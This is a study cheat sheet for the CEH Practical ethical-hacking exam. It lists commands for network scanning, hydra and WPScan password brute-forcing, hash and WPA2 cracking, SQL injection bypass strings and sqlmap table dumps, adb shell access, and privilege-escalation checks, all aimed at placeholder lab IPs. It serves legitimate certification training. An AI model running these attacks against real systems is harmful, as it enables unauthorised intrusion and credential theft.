# CEH Practical Exam Cheat Sheet

## 🎯 Quick Command Reference

### Network Scanning & Enumeration
```bash
# Basic network discovery
nmap -sn 192.168.0.0/24

# Full port scan
nmap -p- 192.168.0.X

# Service/version detection
nmap -sV 192.168.0.X

# OS detection
nmap -O 192.168.0.X

# Find Domain Controllers
nmap -p 389,636,88,3268 192.168.0.0/24

# LDAP enumeration
nmap --script=ldap-search 192.168.0.X
```

## 🔍 Service-Specific Scans

### Common Services
```bash
# SSH version
nmap -p 22 192.168.0.0/24 -sV

# FTP service
nmap -p 21 192.168.0.0/24 --open

# MySQL service
nmap -p 3306 192.168.0.0/24 --open

# RDP service
nmap -p 3389 192.168.0.0/24 --open

# Web services
nmap -p 80,443,8080 192.168.0.0/24 --open
```

## 🛠️ Password Attacks

### FTP Brute Force
```bash
# Hydra FTP attack
hydra -L users.txt -P passwords.txt ftp://192.168.0.X

# Connect after success
ftp 192.168.0.X
ftp> get flag.txt
```

### WordPress Attacks
```bash
# WPScan enumeration
wpscan --url http://192.168.0.X:8080/CEH -U Sarah -P rockyou.txt

# Metasploit WordPress login
msfconsole
use auxiliary/scanner/http/wordpress_login_enum
set RHOSTS 192.168.0.X
set USERNAME Sarah
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Hash Cracking
```bash
# John the Ripper
john hashes.txt --format=raw-md5 --wordlist=rockyou.txt

# Online resources
# https://crackstation.net/
# https://hashes.com/en/decrypt/hash
```

## 📡 Wireless Attacks

### WPA2 Handshake Cracking
```bash
# Analyze capture file
aircrack-ng handshake.pcap

# Crack with wordlist
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF handshake.pcap
```

### WEP Cracking
```bash
aircrack-ng wep_capture.pcap
```

## 🔓 SQL Injection

### Manual Testing
```sql
-- Basic authentication bypass
' OR '1'='1' --
' OR 1=1 --

-- Union-based
' UNION SELECT 1,2,3 --

-- Error-based
' AND 1=CAST((SELECT table_name FROM information_schema.tables) AS INT) --
```

### SQLMap Automation
```bash
# Basic detection
sqlmap -u "http://192.168.0.X/vuln.php?id=1" --batch

# Database enumeration
sqlmap -u "http://192.168.0.X/vuln.php?id=1" --dbs

# Table dumping
sqlmap -u "http://192.168.0.X/vuln.php?id=1" -D database_name -T users --dump

# DSSS optimized attack
sqlmap -u "http://192.168.0.X/vuln.php?id=1" --threads=10 --batch --dump --optimize
```

## 📊 PCAP Analysis

### Wireshark Filters
```bash
# HTTP POST requests (credentials)
http.request.method == "POST"

# SYN flood detection
tcp.flags.syn == 1 and tcp.flags.ack == 0

# ICMP analysis
icmp

# UDP data
udp

# ARP attacks
arp
```

### Statistics Commands
```bash
# Conversations (IP analysis)
Statistics → Conversations → IPv4

# Protocol hierarchy
Statistics → Protocol Hierarchy
```

## 📱 Mobile & ADB

### Android Device Access
```bash
# Connect to device
adb connect 192.168.0.X:5555

# Shell access
adb shell

# File exploration
find /sdcard -name "*.txt"
ls -la /sdcard/Download/

# Pull files to local machine
adb pull /sdcard/secret.txt ./
```

### File Analysis
```bash
# Check file type
file suspicious.elf

# Calculate entropy
ent file.elf

# Hash calculation
sha384sum file.elf
```

## 🔐 Cryptography & Steganography

### File Decryption
```bash
# Using Cryptool for:
# DES, RC4, Twofish, AES encryption
# Open Cryptool → Encrypt/Decrypt → Symmetric
```

### Steganography
```bash
# Snow (text in whitespace)
snow -C -p "password" secret.txt

# OpenStego (image steganography)
# Use GUI tool for image extraction
```

### VeraCrypt
```bash
# Mount encrypted volume
# Use VeraCrypt GUI with password "test"
```

## 🖥️ Windows Enumeration

### User Management
```cmd
# List users
net user

# User details
net user username

# Local groups
net localgroup
```

### Remote Access
```cmd
# RDP connection
mstsc /v:192.168.0.X

# File browsing
# Navigate to C:\users\username\documents\
```

## 🌐 Web Application Testing

### OWASP ZAP
```bash
# Automated scanning
# Launch ZAP → Automated Scan → Enter target URL
# Check Alerts tab for vulnerabilities
```

### Directory Bruteforcing
```bash
# Gobuster
gobuster dir -u http://192.168.0.X -w /usr/share/wordlists/dirb/common.txt

# Dirb
dirb http://192.168.0.X
```

## ⚡ Privilege Escalation

### Linux
```bash
# Check sudo permissions
sudo -l

# SUID files
find / -perm -4000 2>/dev/null

# Kernel exploits
uname -a
searchsploit kernel_version
```

### Windows
```cmd
# System information
systeminfo

# Installed patches
wmic qfe list

# Service permissions
accesschk.exe -uwcqv "Authenticated Users" *
```

## 📋 Vulnerability Assessment

### NSE Scripts
```bash
# Vulnerability scan
nmap --script vuln 192.168.0.X

# Specific service checks
nmap --script=ftp-* 192.168.0.X -p 21
nmap --script=smb-* 192.168.0.X -p 445
```

### CVSS Scoring
```bash
# After finding CVE, check:
# https://nvd.nist.gov/vuln/detail/CVE-XXXX-XXXX
# Look for CVSS score and EOL/outdated software mentions
```

## 🎮 Practical Scenarios Quick Guide

### Scenario 1: Database OS Identification
```bash
nmap -p 3306 192.168.0.0/24 --open
nmap -O <mysql_server_ip>
```

### Scenario 2: Suspicious User Account
```cmd
net user
# Compare with given list of legitimate users
```

### Scenario 3: FTP Credential Recovery
```bash
# Use Cryptool: DES(ECB) decryption
# Then: ftp <ip>
# get flag1.txt
```

### Scenario 4: Steganography
```bash
snow -C -p "magic" Secret-Accounts.txt
```

### Scenario 5: Mobile Forensics
```bash
adb connect 192.168.0.X:5555
adb shell
find /sdcard -name "*.elf"
adb pull /sdcard/folder ./
ent file.elf
sha384sum highest_entropy.elf
```

### Scenario 6: DoS Attack Analysis
```bash
# Wireshark: Statistics → IPv4 Statistics
# Filter: tcp.flags.syn == 1 and tcp.flags.ack == 0
```

## 🚀 Essential Tools Checklist

| Category | Tools |
|----------|-------|
| **Scanning** | nmap, netdiscover, masscan |
| **Web Apps** | sqlmap, wpscan, OWASP ZAP, Burp Suite |
| **Wireless** | aircrack-ng, wireshark |
| **Password** | hydra, john, hashcat |
| **Steganography** | snow, openstego, steghide |
| **Cryptography** | Cryptool, VeraCrypt |
| **Mobile** | adb, phonesploit |
| **Analysis** | binwalk, ent, file, strings |

## ⏱️ Time Management Tips

1. **First 10 minutes**: Network reconnaissance
2. **Quick wins**: Check common services (FTP, RDP, Web)
3. **Document findings**: Keep notes of IPs, credentials, paths
4. **Flag format**: Pay attention to requested answer format
5. **Validation**: Double-check answers before submission

## ❗ Common Pitfalls

- Forgetting to specify ports in nmap scans
- Not checking both TCP and UDP services
- Overlooking hidden files/directories
- Missing case sensitivity in passwords
- Not verifying successful exploitation

---

**Exam Strategy**: Start with easy wins (network scan → service identification → common exploits) and systematically work through each objective. Good luck! 🎯